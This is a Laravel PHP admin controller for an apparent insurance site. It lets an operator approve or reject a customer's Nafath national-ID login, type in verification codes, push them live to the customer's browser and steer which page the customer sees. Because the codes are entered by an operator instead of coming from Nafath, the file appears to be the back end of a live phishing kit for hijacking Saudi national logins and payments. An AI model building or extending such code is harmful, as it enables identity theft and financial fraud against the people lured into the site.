<?php

namespace App\Http\Controllers\Admin;

use App\Events\NafathApproved;
use App\Events\NafathRejected;
use App\Events\NafathCodeUpdated;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\NafathApproveRequest;
use App\Http\Requests\Admin\NafathRejectRequest;
use App\Http\Requests\Admin\NafathUpdateCodeRequest;
use App\Models\CustomerProfile;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;

class AdminNafathController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve Nafath login — sends verification code to the customer's browser
     */
    public function approve(NafathApproveRequest $request): JsonResponse
    {
        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));

        // Idempotency — already approved, just re-broadcast
        if ($customer->nafath_verified) {
            $code = $request->input('verification_code') ?? $customer->nafath_verification_code;
            try {
                broadcast(new NafathApproved(
                    $customer->session_id,
                    $code,
                    '/insurance/nafath/callback',
                    $customer->id,
                ))->toOthers();
            } catch (\Throwable $e) {
                Log::warning('Broadcast failed (re-broadcast approveNafath): ' . $e->getMessage());
            }
            $this->notifyDashboard($customer, 'nafath_approved');
            $this->refreshPaymentViewed($customer);
            return response()->json([
                'success' => true,
                'message' => 'تمت إعادة إرسال الموافقة على النفاذ',
            ]);
        }

        $code = $request->input('verification_code');

        $customer->update([
            'nafath_verified'          => true,
            'nafath_verification_code' => $code,
            'current_page'             => '/insurance/nafath/callback',
        ]);

        try {
            broadcast(new NafathApproved(
                $customer->session_id,
                $code,
                '/insurance/nafath/callback',
                $customer->id,
            ))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approveNafath): ' . $e->getMessage());
        }

        $this->notifyDashboard($customer, 'nafath_approved');
        $this->refreshPaymentViewed($customer);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على النفاذ — تم إرسال رمز التحقق للعميل',
        ]);
    }

    /**
     * Reject Nafath login
     */
    public function reject(NafathRejectRequest $request): JsonResponse
    {
        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));

        $customer->update([
            'nafath_verified' => false,
        ]);

        try {
            broadcast(new NafathRejected($customer->session_id, $request->input('reason'), $customer->id))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectNafath): ' . $e->getMessage());
        }

        $this->notifyDashboard($customer, 'nafath_rejected');
        $this->refreshPaymentViewed($customer);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض طلب النفاذ',
        ]);
    }

    /**
     * Update Nafath verification code and push to customer via WebSocket
     */
    public function updateCode(NafathUpdateCodeRequest $request): JsonResponse
    {
        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));

        $customer->update([
            'nafath_verification_code' => $request->input('verification_code'),
        ]);

        try {
            if ($customer->session_id) {
                broadcast(new NafathCodeUpdated(
                    $customer->session_id,
                    $request->input('verification_code'),
                    $customer->id,
                ))->toOthers();
            }
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (updateNafathCode): ' . $e->getMessage());
        }

        $this->notifyDashboard($customer, 'nafath_code_updated');

        return response()->json([
            'success' => true,
            'message' => 'تم تحديث رمز التحقق وإرساله للعميل',
        ]);
    }
}
